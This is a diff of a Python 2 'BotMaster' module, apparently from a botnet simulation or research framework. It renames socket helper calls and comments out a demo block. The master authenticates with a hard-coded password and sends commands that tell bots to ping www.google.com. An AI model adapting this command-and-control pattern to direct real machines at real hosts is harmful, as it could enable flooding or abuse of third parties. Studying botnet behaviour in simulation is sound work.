@@ -1,6 +1,5 @@
 #!/usr/bin/env python
-from Client import ClientCMD, client_fsm
-from Node import PhyNode
+from Client import ClientCMD
 from util import abstract_method
 
 class BotMaster(ClientCMD):
@@ -16,12 +15,12 @@ class BotMasterManInput(BotMaster):
             cmd = raw_input('hi master, please input your command: ')
             print 'cmd, ', cmd
             if cmd == 'q':
-                self.node.sock_send(self.sock, 'master exit')
-                self.node.sock_close(self.sock)
+                self.node.send(self.sock, 'master exit')
+                self.node.close_sock(self.sock)
                 break
 
-            self.node.sock_send(self.sock, self._cmd_to_json(cmd))
-            self.node.sock_thread_recv(self.sock, 512, self.echo)
+            self.node.send(self.sock, self._cmd_to_json(cmd))
+            self.node.recv(self.sock, 512, self.echo, threaded=True)
         print 'finish recv_ack'
 
 # class BotMasterShowExistence(ClientCMD):
@@ -42,14 +41,14 @@ class BotMasterOneCMD(BotMaster):
         self.num = num
 
     def recv_ack(self):
-        self.node.sock_send(self.sock,
+        self.node.send(self.sock,
                 self._cmd_to_json('event=verify_master;password=%s;'%(self.master_password)))
         self.node.sleep(self.interval)
         idx = self.num
         while True:
             if idx == 0: break
             idx -= 1
-            self.node.sock_send(self.sock,
+            self.node.send(self.sock,
                     self._cmd_to_json(self.cmd_str) )
             self.node.sleep(self.interval)
 
@@ -61,18 +60,18 @@ class BotMasterTest(BotMasterOneCMD):
             -1,
             'event=forward_to_bots;bot_event=send_ping;hostname=www.google.com;')
 
-if __name__ == "__main__":
+# if __name__ == "__main__":
     # cmd = BotMasterOneCMD(client_fsm,
             # '1234',
             # 2,
             # -1,
             # 'event=echo_bots;msg=I am the master, I have controlled you;')
     # cmd = BotMasterManInput(client_fsm)
-    cmd = BotMasterOneCMD(client_fsm,
-            '1234',
-            2,
-            -1,
-            'event=forward_to_bots;bot_event=send_ping;hostname=www.google.com;')
-    node = PhyNode()
-    cmd.install(node)
-    node.start()
+    # cmd = BotMasterOneCMD(client_fsm,
+    #         '1234',
+    #         2,
+    #         -1,
+    #         'event=forward_to_bots;bot_event=send_ping;hostname=www.google.com;')
+    # node = PhyNode()
+    # cmd.install(node)
+    # node.start()
